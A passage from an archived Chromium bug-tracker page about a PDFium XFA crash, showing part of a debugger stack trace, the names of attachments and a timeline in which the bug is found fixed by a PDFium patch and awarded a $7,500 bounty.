48 0097d418 5405ffe8 chrome!chrome_pdf::PDFiumEngine::LoadDocument(void)+0x11c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2294]   
49 0097d4f0 550cbb4e chrome!chrome_pdf::PDFiumEngine::OnDocumentComplete(void)+0x178 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 685]   
4a 0097d52c 550cbc39 chrome!chrome_pdf::DocumentLoaderImpl::ReadComplete(void)+0x12e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\document_loader_impl.cc @ 405]   
4b 0097d618 550cd380 chrome!chrome_pdf::DocumentLoaderImpl::DidRead(int result = 0n0)+0x89 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\document_loader_impl.cc @ 316]   
4c 0097d630 550cd2df chrome!pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (class chrome_pdf::DocumentLoaderImpl \* object = 0x3fca2f80, int result = 0n0)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 607]   
4d 0097d654 5281b53b chrome!pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome_pdf::DocumentLoaderImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (void \* user_data = 0x3b08cff0, int result = 0n0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 584]   
4e 0097d674 550c86a3 chrome!PP_RunCompletionCallback(struct PP_CompletionCallback \* cc = 0x0097d698, int result = 0n0)+0x2b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 241]   
4f 0097d6ac 550c679e chrome!PP_RunAndClearCompletionCallback(struct PP_CompletionCallback \* cc = 0x39d06f74, int res = 0n0)+0x63 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 282]   
50 0097d6c8 550c72ab chrome!pp::CompletionCallback::RunAndClear(int result = 0n0)+0x4e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\cpp\completion_callback.h @ 100]   
51 0097d7e8 550c8ba0 chrome!chrome_pdf::URLLoaderWrapperImpl::DidRead(int result = 0n0)+0x7b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\url_loader_wrapper_impl.cc @ 272]   
52 0097d800 550c8aff chrome!pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (class chrome_pdf::URLLoaderWrapperImpl \* object = 0x39d06f08, int result = 0n0)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 607]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_shared.dll  
53 0097d824 5a554e1b chrome!pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome_pdf::URLLoaderWrapperImpl,pp::ThreadSafeThreadTraits>::Dispatcher0<void (void \* user_data = 0x3b110ff0, int result = 0n0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 584]   
54 0097d844 5a554dc7 ppapi_shared!PP_RunCompletionCallback(struct PP_CompletionCallback \* cc = 0x3b10cfe0, int result = 0n0)+0x2b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 241]   
55 0097d870 5a5542ec ppapi_shared!ppapi::CallWhileUnlocked<void,PP_CompletionCallback \*,int,PP_CompletionCallback \*,int>(<function> \* function = 0x5a554df0, struct PP_CompletionCallback \*\* p1 = 0x0097d8b8, int \* p2 = 0x0097d8d8)+0x47 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 136]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_proxy.dll  
56 0097d8d0 29e2691b ppapi_shared!ppapi::TrackedCallback::Run(int result = 0n0)+0x1bc [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\tracked_callback.cc @ 141]   
57 0097d9a4 29e26557 ppapi_proxy!ppapi::proxy::URLLoaderResource::RunCallback(int result = 0n0)+0x12b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 336]   
58 0097d9c8 29e28cf9 ppapi_proxy!ppapi::proxy::URLLoaderResource::OnPluginMsgFinishedLoading(class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3b190fa0, int result = 0n0)+0x77 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 282]   
59 0097da04 29e264c2 ppapi_proxy!ppapi::proxy::DispatchResourceReplyImpl<ppapi::proxy::URLLoaderResource,void (class ppapi::proxy::URLLoaderResource \* obj = 0x39aecee8, <function> \* method = 0x29e264e0, class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3b190fa0, class std::__1::tuple<int> \* args_tuple = 0x0097dc24)+0x69 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatch_reply_message.h @ 34]   
5a 0097da58 29e25d49 ppapi_proxy!ppapi::proxy::DispatchResourceReply<ppapi::proxy::URLLoaderResource,void (class ppapi::proxy::URLLoaderResource \* obj = 0x39aecee8, <function> \* method = 0x29e264e0, class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3b190fa0, class std::__1::tuple<int> \* args_tuple = 0x0097dc24)+0x82 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatch_reply_message.h @ 46]   
5b 0097dd18 29d86b83 ppapi_proxy!ppapi::proxy::URLLoaderResource::OnReplyReceived(class ppapi::proxy::ResourceMessageReplyParams \* params = 0x3b190fa0, class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\message_support.dll  
msg = 0x3b190fb8 {size = 0x50})+0x209 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\url_loader_resource.cc @ 220]   
5c 0097de04 29d88ec1 ppapi_proxy!ppapi::proxy::PluginMessageFilter::DispatchResourceReply(class ppapi::proxy::ResourceMessageReplyParams \* reply_params = 0x3b190fa0, class IPC::Message \* nested_msg = 0x3b190fb8 {size = 0x50})+0x173 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\plugin_message_filter.cc @ 116]   
5d 0097de2c 29d88e06 ppapi_proxy!base::internal::FunctorTraits<void (<function> \*\* function = 0x3b190f9c, class ppapi::proxy::ResourceMessageReplyParams \* args = 0x3b190fa0, class IPC::Message \* args = 0x3b190fb8 {size = 0x50})+0x51 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 399]   
5e 0097de58 29d88d7f ppapi_proxy!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x3b190f9c, class ppapi::proxy::ResourceMessageReplyParams \* args = 0x3b190fa0, class IPC::Message \* args = 0x3b190fb8 {size = 0x50})+0x56 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 599]   
5f 0097de7c 29d88c34 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x3b190f9c, class std::__1::tuple<ppapi::proxy::ResourceMessageReplyParams,IPC::Message> \* bound = 0x3b190fa0)+0x6f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 672]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\base.dll  
60 0097dea4 6d751bb0 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x3b190f88)+0x54 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 641]   
61 0097dec8 6d929963 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 99]   
62 0097e150 6d980ed5 base!base::TaskAnnotator::RunTask(char \* trace_event_name = 0x6db1321c "SequenceManager RunTask", struct base::PendingTask \* pending_task = 0x0097e498)+0x5b3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\common\task_annotator.cc @ 144]   
63 0097e508 6d980501 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow \* continuation_lazy_now = 0x0097e5a8, bool \* ran_task = 0x0097e5c3)+0x735 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 365]   
64 0097e5d0 6d812300 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 218]   
65 0097e630 6d98230c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x39e28f2c)+0x60 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_pump_default.cc @ 39]   
66 0097e8c4 6d8bb535 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application_tasks_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 463]   
67 0097eac8 6d8bb1e5 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x335 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 160]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\content.dll  
68 0097eaf4 5d015a9a base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 135]   
69 0097ece0 60d4aeb6 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x0097ed54)+0x5ca [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\ppapi_plugin\ppapi_plugin_main.cc @ 160]   
6a 0097ed0c 60d4bf05 content!content::RunOtherNamedProcessTypeMain(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* process_type = 0x0097ed70 "ppapi", struct content::MainFunctionParams \* main_function_params = 0x0097ed54, class content::ContentMainDelegate \* delegate = 0x0097f344)+0xa6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 578]   
6b 0097eec8 60d477f0 content!content::ContentMainRunnerImpl::Run(bool start_service_manager_only = false)+0x2c5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 871]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\embedder.dll  
6c 0097eee0 307122e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_service_manager_main_delegate.cc @ 52]   
6d 0097f260 60d4acdc embedder!service_manager::Main(struct service_manager::MainParams \* params = 0x0097f284)+0x6d1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\services\service_manager\embedder\main.cc @ 423]   
6e 0097f2ac 50161315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x0097f324)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main.cc @ 20]   
6f 0097f388 00ce8e33 chrome!ChromeMain(struct HINSTANCE__ \* instance = 0x00ce0000, struct sandbox::SandboxInterfaceInfo \* sandbox_info = 0x0097f41c, int64 exe_entry_point_ticks = 0n1245544988125)+0x1f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_main.cc @ 110]   
70 0097f480 00ce147f chrome_exe!MainDllLoader::Launch(struct HINSTANCE__ \* instance = 0x00ce0000, class base::TimeTicks exe_entry_point_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\main_dll_loader_win.cc @ 202]   
71 0097f760 00f16efe chrome_exe!wWinMain(struct HINSTANCE__ \* instance = 0x00ce0000, struct HINSTANCE__ \* prev = 0x00000000)+0x47f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_exe_main_win.cc @ 234]   
72 0097f778 00f17051 chrome_exe!invoke_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123]   
73 0097f7d0 00f1711d chrome_exe!__scrt_common_main_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283]   
74 0097f7d8 00f17128 chrome_exe!__scrt_common_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 326]   
75 0097f7e0 75f60419 chrome_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17]   
76 0097f7f0 77bf662d KERNEL32!BaseThreadInitThunk+0x19  
77 0097f84c 77bf65fd ntdll!__RtlUserThreadStart+0x2f  
78 0097f85c 00000000 ntdll!_RtlUserThreadStart+0x1b  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 11.0 KB)
- [crash_info.txt](attachments/crash_info.txt) (text/plain, 38.2 KB)

## Timeline

### do...@chromium.org (2019-08-05)

Thanks for the report - I think XFA is disabled by default so this doesn't have a security impact, but +PDF folks to look at it.

[Monorail components: Internals>Plugins>PDF]

### do...@chromium.org (2019-08-05)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-08-22)

[Empty comment from Monorail migration]

### hu...@gmail.com (2020-01-07)

Hi guys, 

I just wnat to ask that is there any new update for this issue? 

### hu...@gmail.com (2020-01-08)

Hi guys, 

It seems this issue is patched by https://pdfium-review.googlesource.com/c/pdfium/+/64530. But the patch is assigned to https://crbug.com/chromium/1037981. I can't view this issue but I think this is the same root cause with my issue and mine was submited earlier. 

Could you take a look this again and add this issue to the patch plz? 

### th...@chromium.org (2020-01-08)

[Empty comment from Monorail migration]

### hu...@gmail.com (2020-01-20)

Hello tsepez@, 

Would you mind if I ask that there is any progress for this issue?  

### ts...@chromium.org (2020-01-22)

No, sorry, the lifetimes of the CFXA_FF* objects continue to be a problem which we'd like to fix with a general solution rather than continuing to one-off these.

### hu...@gmail.com (2020-01-23)

Thank you for let me know it! :D

### ts...@chromium.org (2020-02-19)

... and it looks like this old bug was fixed as a side-effect of 5131f71d630 at https://pdfium-review.googlesource.com/c/pdfium/+/64531
huyna, please verify against a current built of chromium.  Sorry again about the delay.

### hu...@gmail.com (2020-02-20)

I verify it again. It seems that this issue is fixed by patch https://pdfium-review.googlesource.com/c/pdfium/+/64531

Sorry cause I spotted wrong patch at https://crbug.com/chromium/990897#c5.   

### [Deleted User] (2020-02-20)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-24)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-02-27)

Congrats the Panel decided to award $7,500 for this report!

### na...@google.com (2020-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-05-28)

This issue was migrated from crbug.com/chromium/990897?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095914)*
